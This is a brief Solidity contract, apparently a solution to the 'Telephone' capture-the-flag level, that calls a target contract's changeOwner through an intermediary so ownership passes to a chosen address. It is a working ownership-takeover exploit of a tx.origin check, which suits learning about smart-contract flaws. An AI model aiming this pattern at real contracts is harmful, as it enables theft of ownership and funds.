// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephonePhishing {

    Telephone telephoneContract;

    constructor(address _addr) public{
        telephoneContract = Telephone(_addr);
    }

    function phish(address _addr) public{
        telephoneContract.changeOwner(_addr);
    }
    
}
